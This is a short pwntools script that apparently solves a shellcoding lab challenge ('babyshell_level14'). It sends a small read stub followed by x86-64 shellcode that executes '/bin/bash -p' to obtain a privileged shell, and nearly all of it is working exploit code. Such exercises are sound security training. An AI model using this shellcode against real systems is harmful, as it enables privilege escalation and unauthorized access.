import glob
from pwn import *

context.update(arch="amd64", encoding="latin")

binary = "/challenge/babyshell_level14"

# multi-stage shellcode
# Stage 1 - which should just jmp to stage2 of shellcode!
# %rax	System call	%rdi	            %rsi	    %rdx	
# 0	    sys_read	unsigned int fd	    char *buf	size_t count
# we can use read, as we won't need to set rax to 0 (which reduces the shellcode size)
shellcode = f'''
push rdx
pop rsi

push rax
pop rdi

syscall
'''

# Stage 2 - code should pop/drop a root shell
# could use execve to drop a shell
# copy code from level 4
shellcode2 = "nop\n"*6
shellcode2 += f'''
push 0x68
push 0x6e69622f
mov dword ptr [rsp+4], 0x7361622f
push rsp
pop rdi
push 0x702d
push rsp
pop rsi
push 0
push rsi
push rdi
push rsp
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
'''
shellcode = asm(shellcode)
shellcode2 = asm(shellcode2)

with process([binary], cwd='/home/hacker') as p:
    print(p.recvuntil(b'[LEAK]').decode())
    print(disasm(shellcode))
    p.send(shellcode)

    time.sleep(1)
    p.send(shellcode2)
    
    print(p.interactive())
